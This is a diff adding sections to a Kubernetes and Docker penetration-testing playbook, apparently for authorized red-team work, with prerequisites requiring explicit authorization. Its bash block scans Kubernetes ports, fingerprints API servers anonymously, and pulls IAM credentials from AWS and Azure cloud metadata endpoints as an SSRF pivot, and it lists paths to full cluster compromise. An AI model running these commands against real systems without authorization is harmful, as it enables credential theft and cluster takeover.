@@ -10,6 +10,42 @@ tags: [kubernetes, k8s, hunt, redteam]
 
 # HUNT-K8S — Kubernetes & Docker Security
 
+## When to Use
+
+- Target runs containerized infra, exposes K8s ports (6443/10250/10255/2379/8443).
+- Cloud metadata reveals K8s service accounts.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `kubectl`, `nmap`, `python3`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Common Kubernetes / container ports
+PORTS="443,6443,8443,8080,10250,10255,10256,2379,2380,4194,9090,9100,30000-30010"
+nmap -sV -p $PORTS $TARGET 2>/dev/null | grep open
+
+# API server fingerprint — the /version endpoint is anonymous on most clusters
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:6443/version"        # {"major":"1","minor":"29","gitVersion":"v1.29.x"...}
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:6443/api"             # APIVersions list, even pre-auth
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:6443/healthz"
+
+# Cloud metadata pivot (reach K8s SA / node creds from an SSRF foothold)
+curl --max-time 30 --connect-timeout 10 -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" # AWS EKS (IMDSv1)
+TOK=$(curl --max-time 30 --connect-timeout 10 -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") # IMDSv2
+curl --max-time 30 --connect-timeout 10 -s -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl --max-time 30 --connect-timeout 10 -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"      # Azure AKS
+# ... (continues in Procedure)
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Crown Jewel Targets
 
 K8s API anonymous cluster-admin = full cluster control. docker.sock + RCE = host root. A single privileged-pod create or a kubelet `/run` shell pivots one finding to total compromise.
